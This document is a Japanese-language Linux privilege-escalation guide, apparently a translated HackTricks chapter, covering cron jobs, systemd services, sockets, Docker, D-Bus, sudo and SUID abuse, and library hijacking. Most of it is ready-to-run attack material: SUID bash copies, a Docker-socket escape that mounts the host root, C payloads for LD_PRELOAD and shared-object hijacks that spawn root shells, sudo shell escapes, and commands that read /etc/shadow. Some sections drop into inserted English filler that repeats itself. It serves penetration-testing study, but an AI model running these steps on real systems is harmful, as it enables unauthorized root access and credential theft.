## スケジュールされた/Cronジョブ

脆弱性のあるスケジュールされたジョブがないか確認してください。おそらく、rootによって実行されるスクリプトを利用することができます（ワイルドカードの脆弱性？rootが使用するファイルを変更できますか？シンボリックリンクを使用しますか？rootが使用するディレクトリに特定のファイルを作成しますか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cronのパス

例えば、_/etc/crontab_ 内にはPATHが記述されています: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー"user"が/home/userに対して書き込み権限を持っていることに注意してください_)

もし、このcrontab内でrootユーザーがパスを設定せずにコマンドやスクリプトを実行しようとした場合、例えば: _\* \* \* \* root overwrite.sh_\
その場合、以下の方法でrootシェルを取得することができます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### スクリプト内のワイルドカードを使用したCron（ワイルドカードインジェクション）

もしルートユーザーによって実行されるスクリプト内のコマンドに「\***」が含まれている場合、これを悪用して予期しないこと（例えば特権昇格）を行うことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが** _**/some/path/\*** **のようなパスの前にある場合、脆弱ではありません（** _**./\*** **であっても脆弱ではありません）。**

ワイルドカードの悪用に関するさらなるトリックについては、次のページを参照してください：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cronスクリプトの上書きとシンボリックリンク

**rootによって実行されるcronスクリプトを変更できる場合、非常に簡単にシェルを取得できます：**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
もしrootによって実行されるスクリプトが、あなたが完全なアクセス権を持つ**ディレクトリ**を使用している場合、そのフォルダを削除し、代わりにあなたが制御するスクリプトがある別のディレクトリへの**シンボリックリンクフォルダ**を作成することは有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁なcronジョブ

プロセスを監視して、1分、2分、または5分ごとに実行されているプロセスを検索することができます。これを利用して特権をエスカレーションすることができるかもしれません。

例えば、**1分間に0.1秒ごとに監視**し、**実行されたコマンドが最も少ない順にソート**し、最も実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**以下のようにも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（これにより、開始するすべてのプロセスが監視およびリストされます）。

### 目に見えないcronジョブ

コメントの後に改行文字を入れることで、cronジョブを作成することができます。例（改行文字に注意してください）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

`.service` ファイルを書き込むことができるかどうかを確認してください。もし書き込むことができれば、サービスが **開始**、**再起動**、または **停止** されたときに、それを **変更して** バックドアを **実行** することができます（おそらくマシンが再起動されるまで待つ必要があります）。\
例えば、.service ファイル内にバックドアを作成し、**`ExecStart=/tmp/script.sh`** とします。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに **書き込み権限** がある場合、バックドアに変更することができます。そのため、サービスが再実行されるとバックドアが実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH を以下のコマンドで確認できます：
```bash
systemctl show-environment
```
もし、パスのいずれかのフォルダに**書き込み**できることがわかった場合、**特権の昇格**が可能かもしれません。次のような**サービス設定ファイルで相対パスが使用されているか**を検索する必要があります。
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、**実行可能な**ファイルを作成し、**相対パスバイナリと同じ名前**でsystemdのPATHフォルダ内に配置します。そして、サービスが脆弱なアクション（**開始**、**停止**、**再読み込み**）を実行するように要求されたときに、**バックドアが実行されます**（一般的には特権のないユーザーはサービスの開始/停止ができませんが、`sudo -l`を使用できるかどうかを確認してください）。

**`man systemd.service`**でサービスについて詳しく学びましょう。

## **タイマー**

**タイマー**は、名前が`**.timer**`で終わるsystemdユニットファイルで、`**.service**`ファイルやイベントを制御します。**タイマー**は、カレンダー時間イベントとモノトニック時間イベントの組み込みサポートを持ち、非同期に実行することができるため、cronの代替として使用することができます。

次のコマンドですべてのタイマーを列挙できます。
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unitの存在するもの（`.service`や`.target`など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、Unitとは何かを読むことができます：

> このタイマーが経過したときにアクティブにするユニット。引数はユニット名であり、サフィックスは ".timer" ではありません。指定されていない場合、この値はタイマーユニットと同じ名前のサービスにデフォルトで設定されます（上記を参照）。アクティブにされるユニット名とタイマーユニットのユニット名は、サフィックスを除いて同じ名前になることが推奨されています。

したがって、この権限を悪用するには、次のことが必要です：

* **書き込み可能なバイナリを実行している**systemdユニット（例：`.service`）を見つける
* **相対パスを実行している**systemdユニットを見つけ、**systemd PATH**上で**書き込み権限**を持っている（その実行可能ファイルをなりすますため）

**`man systemd.timer`でタイマーについて詳しく学びましょう。**

### **タイマーの有効化**

タイマーを有効にするには、ルート権限が必要で、次のコマンドを実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意してください。**タイマー**は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`にそれへのシンボリックリンクを作成することで**アクティブ化**されます。

## ソケット

簡単に言えば、Unixソケット（正確な名前はUnixドメインソケット、**UDS**）は、クライアントサーバーアプリケーションフレームワークで、同じマシンまたは異なるマシン上の2つの異なるプロセス間での**通信を可能にする**ものです。より正確に言えば、これは標準のUnixディスクリプタファイルを使用してコンピュータ間で通信する方法です（[ここから](https://www.linux.com/news/what-socket/)）。

ソケットは`.socket`ファイルを使用して設定できます。

**`man systemd.socket`でソケットについて詳しく学びましょう。**このファイル内では、いくつかの興味深いパラメータを設定できます。

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：これらのオプションは異なりますが、要約すると、ソケットが**どこでリッスンするか**を示します（AF\_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）。
* `Accept`：真偽値の引数を取ります。**true**の場合、**受信した接続ごとにサービスインスタンスが生成**され、接続ソケットのみが渡されます。**false**の場合、すべてのリッスンソケット自体が**開始されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットが生成されます。この値は、単一のサービスユニットがすべての受信トラフィックを無条件に処理するデータグラムソケットとFIFOでは無視されます。**デフォルトはfalse**です。パフォーマンスのために、新しいデーモンは`Accept=no`に適した方法でのみ記述することをお勧めします。
* `ExecStartPre`、`ExecStartPost`：1つ以上のコマンドラインを取ります。これらはリッスン**ソケット**/FIFOが**作成**および**バインド**される**前**または**後**に**実行**されます。コマンドラインの最初のトークンは絶対ファイル名でなければならず、それに続いてプロセスの引数が続きます。
* `ExecStopPre`、`ExecStopPost`：これらは、リッスン**ソケット**/FIFOが**閉じられ**、**削除**される**前**または**後**に**実行**される**追加のコマンド**です。
* `Service`：**受信トラフィック**で**アクティブ化する**ための**サービス**ユニット名を指定します。この設定は、Accept=noのソケットにのみ許可されています。デフォルトでは、ソケットと同じ名前のサービス（接尾辞が置換されたもの）が使用されます。ほとんどの場合、このオプションを使用する必要はありません。

### 書き込み可能な .socket ファイル

**書き込み可能な** `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のようなものを追加することができます。そのため、ソケットが作成される前にバックドアが実行されます。したがって、**おそらくマシンが再起動するまで待つ必要があります。**\
_なお、システムはそのソケットファイルの設定を使用している必要があり、そうでない場合はバックドアは実行されません_

### 書き込み可能なソケット

（ここではUnixソケットについて話しているので、設定の `.socket` ファイルではありません）**書き込み可能なソケット**を特定すると、そのソケットと通信し、脆弱性を悪用することができるかもしれません。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続

To establish a raw connection to a target system, you can use tools like `netcat` or `nc`. These tools allow you to communicate directly with a remote system by opening a TCP or UDP connection.

To connect to a remote system using `netcat`, use the following command:

```
nc <target_ip> <port>
```

Replace `<target_ip>` with the IP address of the target system and `<port>` with the desired port number.

Once the connection is established, you can send and receive data directly through the terminal. This can be useful for various purposes, such as testing network connectivity or interacting with specific services.

Remember to use raw connections responsibly and only on systems that you have proper authorization to access.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP ソケット

HTTP リクエストを待ち受ける **ソケット** が存在する場合があります（_ここで言っているのは .socket ファイルではなく、UNIX ソケットとして機能するファイルです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もしソケットが**HTTPの応答**を返すなら、それと**通信**し、おそらく**いくつかの脆弱性を悪用**することができます。

### 書き込み可能なDockerソケット

**Dockerソケット**は通常、`/var/run/docker.sock`にあり、`root`ユーザーと`docker`グループのみが書き込み権限を持っています。\
もし何らかの理由でそのソケットに対して**書き込み権限を持っている**場合、特権を昇格させることができます。\
以下のコマンドを使用して特権を昇格させることができます:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### Dockerパッケージを使用せずに、ソケットからDocker Web APIを使用する

もし**Dockerソケットにアクセス権がある**が、Dockerバイナリを使用できない場合（おそらくインストールされていないかもしれません）、`curl`を使用して直接Web APIを使用することができます。

以下のコマンドは、ホストシステムのルートをマウントするDockerコンテナを作成し、`socat`を使用して新しいDockerにコマンドを実行する方法の例です。
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
最後のステップは、`socat`を使用してコンテナに接続し、"attach"リクエストを送信することです。
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
### その他

`socat` 接続からコンテナ上でコマンドを実行することができます。

注意点として、もし `docker` グループに所属しているために docker ソケットに対して書き込み権限を持っている場合、[特権昇格のためのより多くの方法があるかもしれません](interesting-groups-linux-pe/#docker-group)。もし [docker API がポートでリッスンしている場合、それを侵害することもできるかもしれません](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**Docker を脱出するための他の方法や特権昇格に悪用する方法** については、以下を参照してください：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 特権昇格

もし **`ctr`** コマンドを使用できることがわかった場合、以下のページを読んでください。**特権昇格に悪用することができるかもしれません**：

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 特権昇格

もし **`runc`** コマンドを使用できることがわかった場合、以下のページを読んでください。**特権昇格に悪用することができるかもしれません**：

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS は、アプリケーション同士が通信し、情報をやり取りし、サービスを要求するためのシンプルでパワフルなメカニズムを提供する **インタープロセス通信 (IPC) システム**です。D-BUS は、現代の Linux システムのニーズを満たすためにゼロから設計されました。

D-BUS は、完全な機能を備えた IPC およびオブジェクトシステムとして、いくつかの用途があります。まず、D-BUS は基本的なアプリケーション IPC を実行できます。つまり、あるプロセスが別のプロセスにデータを送ることができます。UNIX ドメインソケットを強化したものと考えてください。次に、D-BUS はイベントやシグナルをシステムを通じて送信することができます。これにより、システム内の異なるコンポーネントが通信し、最終的により良く統合することができます。たとえば、Bluetooth デーモンは着信コールのシグナルを送信し、音楽プレーヤーはそれを受信して通話が終了するまで音量をミュートにすることができます。最後に、D-BUS はリモートオブジェクトシステムを実装しており、アプリケーションが異なるオブジェクトからサービスを要求し、メソッドを呼び出すことができます。複雑さのない CORBA のようなものです。([ここから](https://www.linuxjournal.com/article/7744)引用)

D-Bus は、各メッセージ（メソッド呼び出し、シグナル送信など）が一致するすべてのポリシールールによって許可または拒否される **許可/拒否モデル** を使用します。ポリシーの各ルールには、`own`、`send_destination`、または `receive_sender` 属性が設定されている必要があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` のポリシーの一部：
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
したがって、ポリシーがユーザーが**バスとやり取りすることを許可**している場合、特権をエスカレーションするためにそれを悪用することができるかもしれません（おそらくいくつかのパスワードをリストアップするだけです）。

ユーザーまたはグループを指定しない**ポリシー**は、すべての人に影響を与えます（`<policy>`）。\
コンテキスト「default」のポリシーは、他のポリシーに影響を受けないすべての人に影響を与えます（`<policy context="default"`）。

**D-Bus通信の列挙とエスカレーションの方法を学ぶには、こちらを参照してください:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **ネットワーク**

ネットワークの列挙を行い、マシンの位置を特定することは常に興味深いです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

アクセスする前に、以前に対話できなかったマシンで実行されているネットワークサービスを常にチェックしてください。
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### スニッフィング

トラフィックをスニッフィングできるかどうかを確認してください。もしできる場合、いくつかの資格情報を取得することができるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**であるか、どのような**特権**を持っているか、システムにはどのような**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**ルート特権**を持っているかを確認します。
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部のLinuxバージョンは、**UID > INT\_MAX**を持つユーザーが特権をエスカレーションできるバグの影響を受けました。詳細は[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、および[こちら](https://twitter.com/paragonsec/status/1071152249529884674)を参照してください。\
**`systemd-run -t /bin/bash`**を使用して**エクスプロイト**します。

### グループ

ルート権限を付与できる可能性のある**いくつかのグループのメンバー**であるかどうかを確認してください：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### クリップボード

クリップボード内に興味深い情報があるかどうかを確認してください（可能な場合）。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー

A password policy is a set of rules and requirements that dictate how passwords should be created and managed within a system. It is an important aspect of security as weak passwords can be easily guessed or cracked, leading to unauthorized access to sensitive information.

パスワードポリシーは、システム内でパスワードを作成および管理するためのルールと要件のセットです。弱いパスワードは簡単に推測または解読されるため、センシティブな情報への不正アクセスにつながる可能性があり、セキュリティの重要な要素です。

A strong password policy typically includes the following requirements:

- Minimum password length: Specifies the minimum number of characters a password must have.
- Complexity requirements: Requires the use of a combination of uppercase and lowercase letters, numbers, and special characters.
- Password expiration: Sets a time limit for how long a password can be used before it must be changed.
- Password history: Prevents users from reusing their previous passwords.
- Account lockout: Temporarily locks an account after a certain number of failed login attempts to prevent brute-force attacks.
- Two-factor authentication: Requires users to provide an additional form of verification, such as a code sent to their mobile device, in addition to their password.

強力なパスワードポリシーには通常、以下の要件が含まれます：

- 最小パスワード長：パスワードに必要な最小文字数を指定します。
- 複雑性の要件：大文字と小文字のアルファベット、数字、特殊文字の組み合わせの使用を要求します。
- パスワードの有効期限：パスワードを変更する前に使用できる期間を設定します。
- パスワードの履歴：ユーザーが以前のパスワードを再利用するのを防ぎます。
- アカウントロックアウト：一定回数のログイン試行失敗後、一時的にアカウントをロックしてブルートフォース攻撃を防止します。
- 二要素認証：パスワードに加えて、ユーザーにモバイルデバイスに送信されるコードなどの追加の確認手段を要求します。
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

もし環境の**パスワードを知っている**場合は、各ユーザーに対してパスワードを使用してログインを試みてください。

### Su Brute

もしノイズを気にしないし、`su`と`timeout`バイナリがコンピュータに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使用してユーザーをブルートフォースすることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、`-a`パラメータを使用してユーザーをブルートフォースすることもできます。

## 書き込み可能なPATHの悪用

### $PATH

もし、$PATHのいくつかのフォルダに**書き込みができる**ことがわかった場合は、書き込み可能なフォルダ内にバックドアを作成し、別のユーザー（理想的にはroot）によって実行されるいくつかのコマンドの名前を付けることで特権を昇格させることができるかもしれません。ただし、そのコマンドは、$PATHの書き込み可能なフォルダよりも前のフォルダには存在しないようにしてください。

### SUDOとSUID

sudoを使用していくつかのコマンドを実行することが許可されているか、suidビットが設定されているかを確認してください。以下のコマンドを使用して確認できます。
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドによって、ファイルの読み取りや書き込み、さらにはコマンドの実行が可能になります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定では、パスワードを知らずに他のユーザーの特権でコマンドを実行することができる場合があります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できます。したがって、ルートディレクトリにSSHキーを追加するか、`sh` を呼び出すことでシェルを取得することは非常に簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際に**環境変数を設定する**ことができます。
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、HTBマシンAdmirerをベースにしており、スクリプトをrootとして実行する際に任意のPythonライブラリを読み込むためにPYTHONPATHハイジャックに対して**脆弱**でした。
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### パスをバイパスしてSudoを実行する

他のファイルを読み取るために**ジャンプ**したり、**シンボリックリンク**を使用します。例えば、sudoersファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
ワイルドカード（\*）が使用されている場合、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定せずにSudoコマンド/SUIDバイナリを使用する

もし、**sudo権限**がパスを指定せずに単一のコマンドに与えられている場合、例えば _hacker10 ALL= (root) less_ のような場合、PATH変数を変更することでこれを悪用することができます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリがパスを指定せずに別のコマンドを実行する場合にも使用することができます（常に**_strings_**で奇妙なSUIDバイナリの内容を確認してください）。

[実行するためのペイロードの例](payloads-to-execute.md)

### コマンドパスを持つSUIDバイナリ

もし、**suid** バイナリが**パスを指定して別のコマンドを実行する**場合、その場合は、suidファイルが呼び出しているコマンドと同じ名前の関数を作成してエクスポートすることができます。

例えば、suidバイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成してエクスポートしてみる必要があります。
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD**は、ローダーがCランタイムライブラリ（libc.so）を含む他のすべての共有ライブラリよりも前にロードする共有ライブラリまたは共有オブジェクトのパスを1つ以上含むオプションの環境変数です。これはライブラリのプリロードと呼ばれます。

このメカニズムが_suid/sgid_実行可能バイナリの攻撃ベクトルとして使用されないようにするために、ローダーは_ruid != euid_の場合に_LD\_PRELOAD_を無視します。このようなバイナリでは、_suid/sgid_である標準パスのライブラリのみがプリロードされます。

**`sudo -l`**の出力の中に「_**env\_keep+=LD\_PRELOAD**_」という文がある場合、sudoを使用していくつかのコマンドを呼び出すことができるため、特権を昇格させることができます。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**として保存してください。
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、それを**コンパイル**してください。以下のコマンドを使用します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、特権を**エスカレーション**して実行します。
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
同様の特権昇格は、攻撃者が**LD\_LIBRARY\_PATH**環境変数を制御している場合に悪用される可能性があります。なぜなら、攻撃者はライブラリが検索されるパスを制御しているからです。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUIDバイナリ - .soインジェクション

もし、**SUID**権限を持つ奇妙なバイナリを見つけた場合、すべての**.so**ファイルが**正しくロードされているか**を確認することができます。以下のコマンドを実行してください。
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
たとえば、次のようなものを見つけた場合: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (ファイルやディレクトリが存在しません)_ それを悪用することができます。

次のコードでファイル _/home/user/.config/libcalc.c_ を作成します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
以下のコマンドを使用してコンパイルします:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## 共有オブジェクトのハイジャック

Shared Object Hijacking（共有オブジェクトのハイジャック）は、特権昇格のための一般的なテクニックです。この攻撃では、アプリケーションが特定の共有オブジェクトをロードする際に、攻撃者が作成した悪意のある共有オブジェクトをロードさせることができます。

攻撃者は、以下の手順に従って共有オブジェクトのハイジャックを実行します。

1. 攻撃者は、アプリケーションがロードする共有オブジェクトの名前を特定します。
2. 攻撃者は、同じ名前の共有オブジェクトを作成し、悪意のあるコードを埋め込みます。
3. 攻撃者は、悪意のある共有オブジェクトをアプリケーションがロードするディレクトリに配置します。
4. アプリケーションが次に起動されるとき、攻撃者が作成した共有オブジェクトがロードされ、攻撃者の悪意のあるコードが実行されます。

共有オブジェクトのハイジャックは、アプリケーションが特権で実行される場合に特に危険です。攻撃者は、特権のあるコードを実行するための権限を取得することができます。

この攻撃を防ぐためには、以下の対策を実施することが重要です。

- アプリケーションがロードする共有オブジェクトのパスを制限する。
- 共有オブジェクトの署名を検証する。
- システムの共有オブジェクトのディレクトリに対するアクセス権を制限する。

これらの対策を実施することで、共有オブジェクトのハイジャックによる特権昇格を防ぐことができます。
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
今、書き込みができるフォルダからライブラリを読み込むSUIDバイナリを見つけたので、必要な名前でそのフォルダにライブラリを作成しましょう。
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
もし、以下のようなエラーが表示された場合、
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
それは、生成されたライブラリに `a_function_name` という名前の関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できるUnixバイナリの選別されたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は、コマンドに引数を**注入することしかできない**場合に使用されます。

このプロジェクトは、制限されたシェルからの脱出、特権の昇格または維持、ファイルの転送、バインドシェルとリバースシェルの生成、および他のポストエクスプロイテーションタスクを容易にするために悪用できるUnixバイナリの正当な機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して、どのsudoルールを悪用できるかを確認できます。

### Sudoトークンの再利用

**sudo特権を持つユーザーとしてシェルにアクセスできる**シナリオでは、ユーザーのパスワードがわからない場合でも、ユーザーが `sudo` を使用してコマンドを実行するのを**待つことができます**。その後、sudoが使用されたセッションのトークンにアクセスし、それを使用してsudoとして何でも実行できます（特権昇格）。

特権昇格のための要件：

* すでにユーザー "_sampleuser_" としてシェルにアクセスできる
* "_sampleuser_" が**最後の15分間**に `sudo` を使用して何かを実行している（デフォルトでは、パスワードを入力せずに `sudo` を使用できるsudoトークンの有効期間）
* `cat /proc/sys/kernel/yama/ptrace_scope` が0である
* `gdb` にアクセスできる（アップロードできる必要があります）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用して一時的に `ptrace_scope` を有効にするか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` と設定して永久に有効にすることができます）

これらの要件がすべて満たされている場合、次のように特権を昇格できます：[**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

